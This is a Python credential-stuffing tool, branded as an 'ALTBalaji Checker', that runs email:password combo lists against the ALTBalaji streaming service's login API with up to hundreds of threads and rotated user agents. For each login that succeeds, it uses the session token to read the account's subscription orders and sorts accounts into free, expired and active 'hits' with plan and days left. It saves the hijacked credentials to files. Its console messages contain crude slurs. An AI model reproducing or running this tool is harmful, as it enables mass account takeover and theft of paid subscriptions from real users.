#!/usr/bin/python3
import json
import requests
import random
import time
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from colorama import init,Fore,Back
from datetime import datetime,date
#import ctypes
from multiprocessing.dummy import Pool,Lock

FailKey=0
Errors=0
Checked=0
Expired=[]
FreeKey=[]
Hits=[]
Path="./Hits-"+str(datetime.now()).replace(" ","T").replace(":","_").split(".")[0]+".txt"
#Path="./Hits-"+str(date.today())+".txt"

def Useragent():
        with open('useragents.txt') as f:
                lines = f.readlines()
                random_line = random.choice(lines) if lines else None
                return random_line.strip("\n")
                f.close()
def Banner():
        init()
        print("#############################################################################\n")
        print(Fore.RED+"ALTBalaji Checker BY \n"+Fore.RESET)
        print(Fore.GREEN+Back.BLACK+"    ██████╗░░█████╗░░██████╗░███╗░░██╗░█████╗░██████╗░")
        print("    ██╔══██╗██╔══██╗██╔════╝░████╗░██║██╔══██╗██╔══██╗")
        print("    ██████╔╝███████║██║░░██╗░██╔██╗██║███████║██████╔╝")
        print("    ██╔══██╗██╔══██║██║░░╚██╗██║╚████║██╔══██║██╔══██╗")
        print("    ██║░░██║██║░░██║╚██████╔╝██║░╚███║██║░░██║██║░░██║")
        print("    ╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚═╝"+Fore.RESET+Back.RESET)
        print("\n                                 Telegram Id "+Fore.MAGENTA+"@R4gnar007"+Fore.RESET)
        print("\n#############################################################################")

def LoadCombo():
    try:
        file = askopenfilename()
        file=open(file)
        Combo=file.readlines()
    except:
        print(Fore.RED+"Sorry Nibba"+Fore.RESET)
        exit(0)
    return Combo

def Login(EmPass):
    global FreeKey,Expired,Hits
    global Path
    global Errors,FailKey,Checked
    l.acquire()
    EmPass=EmPass.strip("\n")
    Email=EmPass.split(":")[0]
    Passwd=EmPass.split(":")[1]
    agent=Useragent()
    headers={"Accept": "application/json, text/plain",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection":"keep-alive",
            "Content-Type": "application/json",
            "Host": "api.cloud.altbalaji.com",
            "Origin": "https://www.altbalaji.com",
            "Referer": "https://www.altbalaji.com/(popup:login)",
            "User-Agent": agent
            }
    url="http://api.cloud.altbalaji.com/accounts/login?domain=IN"
    payload={"username":Email,"password":Passwd}
    try:
        print("Checking Login for",Email,Passwd)
        r=requests.post(url,json=payload,headers=headers)
        #print("After Login",Email,Passwd)
        r=r.json()
        if r['status']=='error':
            #print(r)
            print(Fore.RED+"Login Unsuccessful"+Fore.RESET)
            Checked+=1
            FailKey+=1
            l.release()
        elif r['status']=='ok':
            #print(r)
            print(Fore.GREEN+"Login Successful"+Fore.RESET)
            Checked+=1
            token=r['session_token']
            url="https://payment.cloud.altbalaji.com/accounts/orders?limit=12&order_status=ok&domain=IN"
            headers={"Accept": "application/json, text/plain",
                    "Content-Type": "application/json",
                    "origin": "https://www.altbalaji.com",
                    "referer": "https://www.altbalaji.com/my-account/subscription",
                    "xssession": token,
                    "User-Agent": agent
                    }
            try:
                r=requests.get(url,headers=headers)
                r=r.json()
                if r['count']==0:
                    FreeKey.append(Email+":"+Passwd)
                    print(Fore.CYAN+"Free Account"+Fore.RESET)
                    l.release()
                else:
                    date_str=r['orders'][0]['dates']['valid_to']
                    date_str=date_str.split('T')
                    #date_str="2020-04-30"
                    date_object = datetime.strptime(date_str[0], '%Y-%m-%d').date()
                    today = date.today()
                    if date_object<today:
                        Expired.append(Email+":"+Passwd)
                        print(Fore.MAGENTA+"Expired Account"+Fore.RESET)
                        l.release()
                    else:
                        print(Fore.GREEN+"Found Hit"+Fore.RESET)
                        plan=r['orders'][0]['product']['titles']['default']
                        # print(plan)            
                        rem=(date_object-today)
                        rem=str(rem).split(" d")
                        # print("reamining :",rem)
                        Hit="#############################################################\n"+Email+":"+Passwd+"\nPlan : "+plan+"\nExpiry :"+rem[0]+" days\n#############################################################\n"
                        Hits.append(Hit)
                        with open(Path,"a+") as f:
                            f.writelines(Hit)
                        f.close()
                        l.release()   
            except:
                print("Something Fucked up")
                l.release()
    except:
        Errors+=1
        print(Fore.RED+"Error while Accessing Site"+Fore.RESET)
        l.release()

Banner()
print(Fore.BLUE+"\nWelcome Nibba's"+Fore.RESET)
Tk().withdraw()

print(Fore.GREEN)
if input("Press y & Enter to Load Combos (Email:Pass) : ")=='y':
    EmailPass=LoadCombo()
else:
    exit(0)

print(Fore.RESET+Fore.MAGENTA+"Total Combos Loaded :"+str(len(EmailPass))+Fore.RESET)
try:
    thrds=int(input('\nEnter Number of Threads : '))
    if thrds>400:
        thrds=400
        print("maximum 200 only")
except:
    print("Gaand mara keeping 100")
    thrds=100
print(Fore.CYAN)

if (input("Press any key and Enter to start with Checking : ")):
    pass

f=open(Path,"w+")
f.close()
print(Fore.RESET+Fore.GREEN+"Starting"+Fore.RESET)

l=Lock()
st=0
fn=1
#ctypes.windll.kernel32.SetConsoleTitleW(f" Checked: {Checked}/{str(len(EmailPass))} Bad: {FailKey} Hits: {Hits} CPM: {str(int(Checked/((fn-st)/60)))}")
st=time.time()
with Pool(thrds) as p:
    p.map(Login,EmailPass)
p.join()
fn=time.time()

print(Fore.BLUE+"\nChecked : "+str(Checked)+Fore.RESET+Fore.YELLOW+"     CPM : "+str(int(Checked/((fn-st)/60)))+Fore.RESET)
print(Fore.RED+"\nFailed  : "+str(FailKey)+Fore.RESET)
print(Fore.CYAN+"Free    : "+str(len(FreeKey))+Fore.RESET)
print(Fore.MAGENTA+"Expired : "+str(len(Expired))+Fore.RESET)
print(Fore.GREEN+"Hits    : "+str(len(Hits))+Fore.RESET)

pero=True
while pero:
    p=input("\nwhat you want to Export \n1.Free(Free.txt)\n2.Expired(Expired.txt)\n3.Hits On Terminal\n[Other Number for Exit] : ")
    try:
        if int(p):
            p=int(p)
            pass
    except:
        try:
            p=int(input("Please Enter Number Only : "))
        except:
            print("Gaand mara bsdk")
        
    if p==1:
        with open("./Free"+str(date.today())+".txt","w+") as f:
            for x in FreeKey:
                f.writelines(x+"\n")
        f.close() 
    elif p==2:
        with open("./Expired"+str(date.today())+".txt","w+") as f:
            for x in Expired:
                f.writelines(x+"\n")
        f.close()
    elif p==3:
        for x in Hits:
            print(x)
    else:
        pero=False
